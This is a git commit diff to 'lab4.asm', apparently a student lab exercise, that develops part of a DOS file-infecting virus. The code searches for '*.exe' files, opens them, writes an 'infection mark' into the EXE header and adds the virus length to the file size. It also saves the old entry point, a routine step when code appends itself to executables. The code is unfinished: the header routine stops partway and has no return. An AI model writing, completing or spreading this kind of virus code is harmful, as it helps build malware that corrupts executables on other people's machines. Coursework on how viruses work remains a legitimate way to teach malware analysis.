b12e9b631e742eddb70cef4c730e87c981ae9df7
Sedo-KFM <fedor122448@gmail.com>
2023-03-14 23:46:30 +0400

    lab 4 proc smol upd

--- source/lab4.asm
+++ source/lab4.asm
@@ -29,7 +29,7 @@ int 21h
 
 ; opening the file (file descriptor -> ax)
 file_open:
-lea dx, file.fname
+lea dx, file.f_name
 mov ax, 3D02h
 int 21h
 mov bx, ax ; file descriptor (ax) -> bx
@@ -62,7 +62,7 @@ int 21h
 
 ; PAYLOAD BEGIN
 
-lea dx, file.fname
+lea dx, file.f_name
 call str_f2c
 mov ah, 09h
 int 21h
@@ -77,20 +77,26 @@ procedures:
 
 ; the new header vals calc proc
 calculate_header proc
+    ; stash all registers to the stack
+    push ax
+    push bx
+    push cx
+    push dx
 
-; stash registers values
-push ax
-push bx
-push cx
-push dx
+    ; infection mark
+    mov header[13h], '3'
 
-; infection mark
-mov header[13h],'3'
+    ; filesize
+    mov ax, word ptr file.f_size[0]
+    mov bx, word ptr file.f_size[2]
+    add ax, vir_len
+    adc bx, 0
 
-; filesize
-mov ax, word ptr file.fsize[0]
-mov dx, word ptr file.fsize[2]
-
+    ; restore all stashed registers from the stack
+    pop dx
+    pop cx
+    pop bx
+    pop ax
 calculate_header endp
 
 ; converting file-str to console-str in dx
@@ -138,20 +144,41 @@ str_c2f endp
 data:
 ; DTA buffer structure
 DTAFileInfo struc
-reserved db 21 dup(?)
-fattr db ?
-ftime dw ?
-fdate dw ?
-fsize dd ?
-fname db 13 dup(?)
+    f_reserved db 21 dup(?)
+    f_attr db ?
+    f_time dw ?
+    f_date dw ?
+    f_size dd ?
+    f_name db 13 dup(?)
+ends
+
+ExeHeader struc
+    x_signature dw ?
+    x_size_l dw ?
+    x_size_h dw ?
+    x_addr_table_size dw ?
+    x_title_size dw ?
+    x_min_pars_for_boot dw ?
+    x_max_pars_for_boot dw ?
+    x_stack_offset dw ?
+    x_sp_init dw ?
+    x_check_sum dw ?
+    x_ip_init dw ?
+    x_cs_offset dw ?
+    x_addrs_setup_offset dw ?
+    x_is_overlay dw ?
+    x_dynamic_addrs_table dw ?
 ends
 
 file DTAFileInfo <>
-
+vir_len equ offset vir_end - offset start
 file_descriptor dw, ?
 file_mask db '*.exe*', 0
-header db 1ah dup(?)
+header ExeHeader <>
+
+inserting_data:
 old_ip dw, ?
 old_cs dw, ?
 
+vir_end:
 end start
